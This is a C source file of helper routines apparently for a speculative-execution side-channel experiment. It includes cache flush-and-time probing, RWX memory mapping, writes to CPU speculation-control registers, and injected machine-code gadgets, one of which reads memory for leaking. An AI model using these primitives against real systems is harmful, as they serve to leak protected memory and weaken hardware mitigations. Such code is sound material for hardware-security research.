#define _GNU_SOURCE             /* See feature_test_macros(7) */
#include <sched.h>
#include <sys/mman.h>
#include <linux/mman.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>


#define THRESHOLD 0x70

void SetCoreAffinity(int coreNumber){
    int result;

    cpu_set_t  mask;
    CPU_ZERO(&mask);
    CPU_SET(coreNumber, &mask);
    result = sched_setaffinity(0, sizeof(mask), &mask);

    if(result){
        printf("failed to set affinity to core %i",coreNumber);
        exit(2);
    }

}

void flush(uint8_t *adrs)
{
    asm volatile (
        "clflush [%0]                   \n"
        "mfence             \n"
        "lfence             \n"
      :
      : "c" (adrs)
      : "rax");
}

unsigned probe(uint8_t *adrs)
{
    volatile unsigned long time;
    asm __volatile__(
        "    mfence             \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    lfence             \n"
        "    mov esi, eax       \n"
        "    mov eax,[%1]       \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    sub eax, esi       \n"
        "    clflush [%1]       \n"
        "    mfence             \n"
        "    lfence             \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx"
    );
    return time;
}

uint8_t * requestMem(uint8_t *requestedAddr, unsigned size){
    uint8_t *result;

    result = (uint8_t *)mmap(requestedAddr, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE| MAP_ANONYMOUS ,-1, 0);
    if(result!=requestedAddr && requestedAddr!=NULL){
        printf("mmap failed for %p : returned %p \n",requestedAddr,result);
        exit(1);
    }
    return result;
}


void wrmsr_on_cpu(uint32_t reg, int cpu, uint64_t data)
{
	int fd;
	char msr_file_name[64];
    static int errReg72=0;
    static int errReg73=0;
	sprintf(msr_file_name, "/dev/cpu/%d/msr", cpu);
	fd = open(msr_file_name, O_WRONLY);
	if (fd < 0) {
		if (errno == ENXIO) {
			fprintf(stdout, "wrmsr: No CPU %d\n", cpu);
			
		} else if (errno == EIO) {
			fprintf(stdout, "wrmsr: CPU %d doesn't support MSRs\n",cpu);
			
		} else {
			perror("wrmsr: open");
			
		}
	}

	size_t res = pwrite(fd, &data, sizeof(data), reg);

    if (res != sizeof(data)) {
        if (errno == EIO) {
            if(reg==73){
                errReg73++;
                if(errReg73<=1){
                    fprintf(stdout,"wrmsr: CPU %d cannot set MSR on reg %d to %d\n",cpu, reg, data);
                }
            }
            if(reg==72){
                errReg72++;
                if(errReg72<=1){
                    fprintf(stdout,"wrmsr: CPU %d cannot set MSR on reg %d to %d\n",cpu, reg, data);
                }
            }
            
            
        } else {
            perror("wrmsr: pwrite");
            
        }
    }
	

	close(fd);
}



uint64_t rdmsr_on_cpu(uint32_t reg, int cpu)
{
	uint64_t data;
	int fd;
	char msr_file_name[64];
    static int errReg=0;

	sprintf(msr_file_name, "/dev/cpu/%d/msr", cpu);
	fd = open(msr_file_name, O_RDONLY);
	if (fd < 0) {
		if (errno == ENXIO) {
			fprintf(stdout, "rdmsr: No CPU %d\n", cpu);
            return -1;
			
		} else if (errno == EIO) {
			fprintf(stdout, "rdmsr: CPU %d doesn't support MSRs\n",cpu);
			return -1;
		} else {
			perror("rdmsr: open");
			return -1;
		}
	}

	if (pread(fd, &data, sizeof(data), reg) != sizeof(data)) {
		if (errno == EIO) {
            errReg++;
            if(errReg<=1){
                fprintf(stdout, "rdmsr: CPU %d cannot read reg %d\n", cpu, reg);
            }
            return -1;
		} else {
			perror("rdmsr: pread");
            return -1;
			
		}
	}

	close(fd);
    return data;
}

#define RET_GADGET                      "\xc3"

//mov r13,[r13]
//ret
#define RD_GADGET                       "M\x8bm\x00\xc3"


void jitForLoop(uint8_t *rwx)
{
    uint8_t g1[]="\x48\xc7\xc0\xc8\x00\x00\x00\x48\xff\xc8\x75\xfb\x0f\x31\x90\xff\x27";
    memcpy(rwx, g1, sizeof(g1));
}



uint32_t callGadget(uint8_t *code,uint8_t *rdiPtr,uint8_t *probeArray){
    asm __volatile__(
        "mov r13, %2    \n"
        "mov rdi, %1    \n"
        "call %0       \n"
        :
        : "r"(code),"m"(rdiPtr),"m"(probeArray)
        : "rdi"
    );
}

void copyLeakGadget(uint8_t *dst){
    memcpy(dst,RD_GADGET,sizeof(RD_GADGET));    
}

void copyRetGadget(uint8_t *dst){
    memcpy(dst,RET_GADGET,sizeof(RET_GADGET));    
}